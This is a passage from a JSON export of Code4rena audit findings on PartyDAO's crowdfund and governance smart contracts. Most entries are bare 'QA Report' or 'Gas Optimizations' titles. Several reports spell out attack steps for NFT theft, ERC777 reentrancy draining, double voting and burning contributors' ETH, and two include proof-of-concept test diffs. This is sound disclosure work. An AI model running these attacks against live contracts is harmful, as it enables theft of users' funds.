Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfund.sol#L98-L116   # Vulnerability details  ## Impact  Party is DOS'd and may potentially lose access to NFT  ## Proof of Concept  [Crowdfund.sol#L280-L298](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L280-L298)      party = party_ = partyFactory         .createParty(             address(this),             Party.PartyOptions({                 name: name,                 symbol: symbol,                 governance: PartyGovernance.GovernanceOpts({                     hosts: governanceOpts.hosts,                     voteDuration: governanceOpts.voteDuration,                     executionDelay: governanceOpts.executionDelay,                     passThresholdBps: governanceOpts.passThresholdBps,                     totalVotingPower: _getFinalPrice().safeCastUint256ToUint96(),                     feeBps: governanceOpts.feeBps,                     feeRecipient: governanceOpts.feeRecipient                 })             }),             preciousTokens,             preciousTokenIds         );  [BuyCrowdfundBase.sol#L166-L173](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L166-L173)      function _getFinalPrice()         internal         override         view         returns (uint256)     {         return settledPrice;     }  When BuyCrowdFund.sol successfully completes a buy, totalVotingPower is set to _getFinalPrice which in the case of BuyCrowdFundBase.sol returns the price at which the NFT was purchased. totalVotingPower is used by the governance contract to determine the number of votes needed for a proposal to pass. If there are not enough claimable votes to meet that threshold then the party is softlocked because it can't pass any proposals. An attacker could exploit this to DOS even a private party with the following steps:  1. Wait for party to be filled to just under quorum threshold 2. Donate ETH to the crowdfund contract 3. Call BuyCrowdFund.sol#buy. Since it is unpermissioned even for parties with a gatekeeper, the call won't revert  Since the voting power for the final amount of ETH cannot be claimed, the party is now softlocked. If emergencyExecuteDisabled is true then the party will be permanantly locked and the NFT would effectively be burned. If emergencyExecuteDisabled is false then users would have to wait for PartyDAO to reclaim the NFT.  ## Tools Used  ## Recommended Mitigation Steps  Permission to call BuyCrowdFund.sol#buy should be gated if there is a gatekeeper"}, {"title": "Majority could steal ETH from sale using ArbitraryCallsProposal.sol before anyone calls PartyGovernance.sol#distribute", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/191", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Majority could steal ETH from sale using ArbitraryCallsProposal.sol before anyone calls PartyGovernance.sol#distribute"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/190", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/188", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/187", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "old-submission-method"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Excess eth is not refunded", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/186", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L72   # Vulnerability details  ## Impact The ArbitraryCallsProposal contract requires sender to provide eth(msg.value) for each call. Now if user has provided more eth than combined call.value then this excess eth is not refunded back to user  ## Proof of Concept  1. Observe the [_executeArbitraryCalls function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L37)  ``` function _executeArbitraryCalls(         IProposalExecutionEngine.ExecuteProposalParams memory params     )         internal         returns (bytes memory nextProgressData)     {  ... uint256 ethAvailable = msg.value;         for (uint256 i = 0; i < calls.length; ++i) {             // Execute an arbitrary call.             _executeSingleArbitraryCall(                 i,                 calls[i],                 params.preciousTokens,                 params.preciousTokenIds,                 isUnanimous,                 ethAvailable             );             // Update the amount of ETH available for the subsequent calls.             ethAvailable -= calls[i].value;             emit ArbitraryCallExecuted(params.proposalId, i, calls.length);         } .... } ```  2. As we can see user provided msg.value is deducted with each calls[i].value 3. Assume user provided 5 amount as msg.value and made a single call with calls[0].value as 4 4. This means after calls have been completed ethAvailable will become 5-4=1 5. Ideally this 1 eth should be refunded back to user but there is no provision for same and the fund will remain in contract   ## Recommended Mitigation Steps At the end of _executeArbitraryCalls function, refund the remaining ethAvailable back to the user"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/185", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/182", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Maximum bid will always be used in Auction", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/179", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149   # Vulnerability details  ## Impact AuctionCrowdfund contract is designed in a way to allow bidding max upto maximumBid. But due to a flaw, anyone (including NFT seller) can make sure that CrowdFund bid always remain equal to maximumBid thus removing the purpose of maximumBid. This also causes loss to Party participating in this Auction as the auction will always end up with maximumBid even when it could have stopped with lower bid as shown in POC  ## Proof of Concept 1. An auction is started for NFT N in the market 2. Party Users P1 starts an AuctionCrowdfund with maximumBid as 100 for this auction.  ``` function initialize(AuctionCrowdfundOptions memory opts)         external         payable         onlyConstructor     { ... maximumBid = opts.maximumBid; ... } ```  3. P1 bids amount 10 for the NFT N using [bid function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149) 4. Some bad news arrives for the NFT collection including NFT N reducing its price 5. P1 decides not to bid more than amount 10 due to this news 6. NFT collection owner who is watching this AuctionCrowdfund observes that bidding is only 10 but Party users have maximumBid of 100 7. NFT collection owner  asks his friend to bid on this NFT in the auction market (different from crowd fund) 8. NFT collection owner now takes advantage of same and himself calls the bid function of AuctionCrowdfund via Proxy  ``` function bid() external onlyDelegateCall { ... } ```  9. Now since last bid belongs to collection owner friend, so AuctionCrowdfund contract simply extends its bid further   ``` if (market.getCurrentHighestBidder(auctionId_) == address(this)) {             revert AlreadyHighestBidderError();         }         // Get the minimum necessary bid to be the highest bidder.         uint96 bidAmount = market.getMinimumBid(auctionId_).safeCastUint256ToUint96();         // Make sure the bid is less than the maximum bid.         if (bidAmount > maximumBid) {             revert ExceedsMaximumBidError(bidAmount, maximumBid);         }         lastBid = bidAmount; ```  10. NFT collection owner keeps repeating step 7-9 until AuctionCrowdfund reaches the final maximum bid of 100 11. After auction completes, collection owner gets 100 amount instead of 10 even though crowd fund users never bidded for amount 100  ## Recommended Mitigation Steps maximumbid concept can easily be bypassed as shown above and will not make sense. Either remove it completely    OR bid function should only be callable via crowdfund members then attacker would be afraid if new bid will come or not and there should be a consensus between crowdfund members before bidding which will protect this scenario"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/178", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/177", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/176", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/174", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/170", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/169", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/168", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/165", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/161", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/160", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/158", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/157", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "ArbitraryCallsProposal.sol and ListOnOpenseaProposal.sol safeguards can be bypassed by cancelling in-progress proposal allowing the majority to steal NFT", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/153", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L183-L202   # Vulnerability details  Note: PartyDAO acknowledges that \"canceling an InProgress proposal (mid-step) can leave the governance party in a vulnerable or undesirable state because there is no cleanup logic run during a cancel\" in the \"Known Issues / Topics\" section of the contest readme. I still believe that this vulnerability needs to be mitigated as it can directly lead to loss of user funds.  ## Impact  Majority vote can abuse cancel functionality to steal an NFT owned by the party  ## Proof of Concept  ArbitraryCallsProposal.sol implements the following safeguards for arbitrary proposals that are not unanimous:  1. Prevents the ownership of any NFT changing during the call. It does this by checking the the ownership of all NFTs before and after the call.  2. Prevents calls that would change the approval status of any NFT. This is done by disallowing the \"approve\" and \"setApprovalForAll\" function selectors.  Additionally ListOnOpenseaProposal.sol implements the following safeguards:  1. NFTs are first listed for auction on Zora so that if they are listed for a very low price then the auction will keep them from being purchased at such a low price  2. At the end of the auction the approval is revoked when _cleanUpListing is called  These safeguards are ultimately ineffective though. The majority could use the following steps to steal the NFT:  1. Create ListOnOpenseaProposal with high sell price and short cancel delay  2. Vote to approve proposal with majority vote  3. Execute first step of proposal, listing NFT on Zora auction for high price  4. Wait for Zora auction to end since the auction price is so high that no one will buy it  5. Execute next step, listing the NFT on Opensea. During this step the contract grants approval of the NFT to the Opensea contract  6. Wait for cancelDelay to expire  7. Call PartyGovernance.sol#cancel. This will immediately terminate the Opensea bypassing _cleanUpListing and keeping the approval to the Opensea contract  8. Create ArbitraryCallsProposal.sol that lists the NFT on Opensea for virtually nothing. Since only approval selectors have been blacklisted and the NFT does not change ownership, the proposal does not need to be unanimous to execute.  9. Approve proposal and execute  10. Buy NFT  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  When a proposal is canceled, it should call a proposal specific function that makes sure everything is cleaned up. NFTs delisted, approvals revoked, etc."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/151", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "AuctionCrowdfund: If the contract was bid on before the NFT was gifted to the contract, lastBid will not be totalContributions", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/147", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242   # Vulnerability details  ## Impact In the finalize function of the AuctionCrowdfund contract, when the contract gets NFT and lastBid_ == 0, it is considered that NFT is gifted to the contract and everyone who contributed wins. ```         if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {             if (lastBid_ == 0) {                 // The NFT was gifted to us. Everyone who contributed wins.                 lastBid_ = totalContributions; ``` But if the contract was bid before the NFT was gifted to the contract, then since lastBid_ ! = 0, only the user who contributed at the beginning will win. ## Proof of Concept https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L149-L175 ## Tools Used None ## Recommended Mitigation Steps Whether or not NFT is free to get should be determined using whether the contract balance is greater than totalContributions"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/145", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/144", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Buying non-ERC721 NFTs is not supported", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/142", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-party-findings", "body": "Buying non-ERC721 NFTs is not supported"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/128", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor disputed", "edited-by-warden"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/126", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/125", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/122", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "TokenDistributor: ERC777 tokensToSend hook can be exploited to drain contract", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/120", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L131 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L386   # Vulnerability details  ## Impact `TokenDistributor.createERC20Distribution` can be used to create token distributions for ERC777 tokens (which are backwards-compatible with ERC20). However, this introduces a reentrancy vulnerability which allows a party to get the tokens of another party. The problem is the `tokensToSend` hook which is executed BEFORE balance updates happens (see https://eips.ethereum.org/EIPS/eip-777). When this hook is executed, `token.balanceOf(address(this))` therefore still returns the old value, but `_storedBalances[balanceID]` was already decreased.  ## Proof Of Concept Party A and Party B have a balance of 1,000,000 tokens (of some arbitrary ERC777 token) in the distributor. Let's say for the sake of simplicity that both parties only have one user (user A in party A, user B in party B). User A (or rather his smart contract) performs the following attack: - He calls `claim`, which transfers 1,000,000 tokens to his contract address. In `_transfer`, `_storedBalances[balanceId]` is decreased by 1,000,000 and therefore now has a value of 1,000,000. - In the `tokensToSend` hook, he initiates another distribution for his party A by calling `PartyGovernance.distribute` which calls `TokenDistributor.createERC20Distribution` (we assume for the sake of simplicity that the party does not have more of these tokens, so the call transfers 0 tokens to the distributor). `TokenDistributor.createERC20Distribution` passes `token.balanceOf(address(this))` to `_createDistribution`. Note that this is still 2,000,000 because we are in the `tokensToSend` hook. - The supply of this distribution is calculated as `(args.currentTokenBalance - _storedBalances[balanceId]) = 2,000,000 - 1,000,000 = 1,000,000`. - When the `tokensToSend` hook is exited (and the first transfer has finished), he can retrieve the tokens of the second distribution (that was created in the hook) to steal the 1,000,000 tokens of party B.  ## Recommended Mitigation Steps Do not allow reentrancy in these functions."}, {"title": "Possible that unanimous votes is unachievable", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/114", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Possible that unanimous votes is unachievable"}, {"title": "PartyGovernance: Can vote multiple times by transferring NFT in same block as proposal", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/113", "labels": ["bug", "3 (High Risk)", "high quality report", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L594   # Vulnerability details  ## Impact `PartyGovernanceNFT` uses the voting power at the time of proposal when calling `accept`. The problem with that is that a user can vote, transfer the NFT (and the voting power) to a different wallet, and then vote from this second wallet again during the same block that the proposal was created.  This can also be repeated multiple times to get an arbitrarily high voting power and pass every proposal unanimously.   The consequences of this are very severe. Any user (no matter how small his voting power is) can propose and pass arbitrary proposals animously and therefore steal all assets (including the precious tokens) out of the party.  ## Proof Of Concept This diff shows how a user with a voting power of 50/100 gets a voting power of 100/100 by transferring the NFT to a second wallet that he owns and voting from that one: ```diff --- a/sol-tests/party/PartyGovernanceUnit.t.sol +++ b/sol-tests/party/PartyGovernanceUnit.t.sol @@ -762,6 +762,7 @@ contract PartyGovernanceUnitTest is Test, TestUtils {          TestablePartyGovernance gov =              _createGovernance(100e18, preciousTokens, preciousTokenIds);          address undelegatedVoter = _randomAddress(); +        address recipient = _randomAddress();          // undelegatedVoter has 50/100 intrinsic VP (delegated to no one/self)          gov.rawAdjustVotingPower(undelegatedVoter, 50e18, address(0));   @@ -772,38 +773,13 @@ contract PartyGovernanceUnitTest is Test, TestUtils {          // Undelegated voter submits proposal.          vm.prank(undelegatedVoter);          assertEq(gov.propose(proposal, 0), proposalId); - -        // Try to execute proposal (fail). -        vm.expectRevert(abi.encodeWithSelector( -            PartyGovernance.BadProposalStatusError.selector, -            PartyGovernance.ProposalStatus.Voting -        )); -        vm.prank(undelegatedVoter); -        gov.execute( -            proposalId, -            proposal, -            preciousTokens, -            preciousTokenIds, -            \"\", -            \"\" -        ); - -        // Skip past execution delay. -        skip(defaultGovernanceOpts.executionDelay); -        // Try again (fail). -        vm.expectRevert(abi.encodeWithSelector( -            PartyGovernance.BadProposalStatusError.selector, -            PartyGovernance.ProposalStatus.Voting -        )); -        vm.prank(undelegatedVoter); -        gov.execute( -            proposalId, -            proposal, -            preciousTokens, -            preciousTokenIds, -            \"\", -            \"\" -        ); +        (, PartyGovernance.ProposalStateValues memory valuesPrev) = gov.getProposalStateInfo(proposalId); +        assertEq(valuesPrev.votes, 50e18); +        gov.transferVotingPower(undelegatedVoter, recipient, 50e18); //Simulate NFT transfer +        vm.prank(recipient); +        gov.accept(proposalId, 0); +        (, PartyGovernance.ProposalStateValues memory valuesAfter) = gov.getProposalStateInfo(proposalId); +        assertEq(valuesAfter.votes, 100e18);      } ```  ## Recommended Mitigation Steps You should query the voting power at `values.proposedTime - 1`. This value is already finalized when the proposal is created and therefore cannot be manipulated by repeatedly transferring the voting power to different wallets."}, {"title": "Possibility to burn all ETH in Crowdfund under some circumstances", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/105", "labels": ["bug", "3 (High Risk)", "high quality report", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L147   # Vulnerability details  ## Impact If `opts.initialContributor` is set to `address(0)` (and `opts.initialDelegate` is not), there are two problems: 1.) If the crowdfund succeeds, the initial balance will be lost. It is still accredited to `address(0)`, but it is not retrievable.  2.) If the crowdfund does not succeed, anyone can completely drain the contract by repeatedly calling `burn` with `address(0)`. This will always succeed because `CrowdfundNFT._burn` can be called multiple times for `address(0)`. Every call will cause the initial balance to be burned (transferred to `address(0)`).  Issue 1 is somewhat problematic, but issue 2 is very problematic, because all funds of a crowdfund are burned and an attacker can specifically set up such a deployment (and the user would not notice anything special, after all these are parameters that the protocol accepts).  ## Proof Of Concept This diff illustrates scenario 2, i.e. where a malicious deployer burns all contributions (1 ETH) of `contributor`. He loses 0.25ETH for the attack, but this could be reduced significantly (with more `burn(payable(address(0)))` calls:  ```diff --- a/sol-tests/crowdfund/BuyCrowdfund.t.sol +++ b/sol-tests/crowdfund/BuyCrowdfund.t.sol @@ -36,9 +36,9 @@ contract BuyCrowdfundTest is Test, TestUtils {      string defaultSymbol = 'PBID';      uint40 defaultDuration = 60 * 60;      uint96 defaultMaxPrice = 10e18; -    address payable defaultSplitRecipient = payable(0); +    address payable defaultSplitRecipient = payable(address(this));      uint16 defaultSplitBps = 0.1e4; -    address defaultInitialDelegate; +    address defaultInitialDelegate = address(this);      IGateKeeper defaultGateKeeper;      bytes12 defaultGateKeeperId;      Crowdfund.FixedGovernanceOpts defaultGovernanceOpts; @@ -78,7 +78,7 @@ contract BuyCrowdfundTest is Test, TestUtils {                      maximumPrice: defaultMaxPrice,                      splitRecipient: defaultSplitRecipient,                      splitBps: defaultSplitBps, -                    initialContributor: address(this), +                    initialContributor: address(0),                      initialDelegate: defaultInitialDelegate,                      gateKeeper: defaultGateKeeper,                      gateKeeperId: defaultGateKeeperId, @@ -111,40 +111,26 @@ contract BuyCrowdfundTest is Test, TestUtils {      function testHappyPath() public {          uint256 tokenId = erc721Vault.mint();          // Create a BuyCrowdfund instance. -        BuyCrowdfund pb = _createCrowdfund(tokenId, 0); +        BuyCrowdfund pb = _createCrowdfund(tokenId, 0.25e18);          // Contribute and delegate.          address payable contributor = _randomAddress();          address delegate = _randomAddress();          vm.deal(contributor, 1e18);          vm.prank(contributor);          pb.contribute{ value: contributor.balance }(delegate, \"\"); -        // Buy the token. -        vm.expectEmit(false, false, false, true); -        emit MockPartyFactoryCreateParty( -            address(pb), -            address(pb), -            _createExpectedPartyOptions(0.5e18), -            _toERC721Array(erc721Vault.token()), -            _toUint256Array(tokenId) -        ); -        Party party_ = pb.buy( -            payable(address(erc721Vault)), -            0.5e18, -            abi.encodeCall(erc721Vault.claim, (tokenId)), -            defaultGovernanceOpts -        ); -        assertEq(address(party), address(party_)); -        // Burn contributor's NFT, mock minting governance tokens and returning -        // unused contribution. -        vm.expectEmit(false, false, false, true); -        emit MockMint( -            address(pb), -            contributor, -            0.5e18, -            delegate -        ); -        pb.burn(contributor); -        assertEq(contributor.balance, 0.5e18); +        vm.warp(block.timestamp + defaultDuration + 1); +        // The auction was not won, we can now burn all ETH from contributor... +        assertEq(address(pb).balance, 1.25e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 1e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.75e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.5e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.25e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0); ```  ## Recommended Mitigation Steps Do not allow an initial contribution when `opts.initialContributor` is not set."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/101", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/97", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/94", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/91", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/90", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/88", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "old-submission-method"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "A malicious Market Wrapper can disrupt the Auction Crowdfund ", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-party-findings", "body": "A malicious Market Wrapper can disrupt the Auction Crowdfund "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/80", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/78", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/75", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor disputed", "edited-by-warden"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/72", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/67", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/66", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/65", "labels": ["bug", "G (Gas Optimization)", 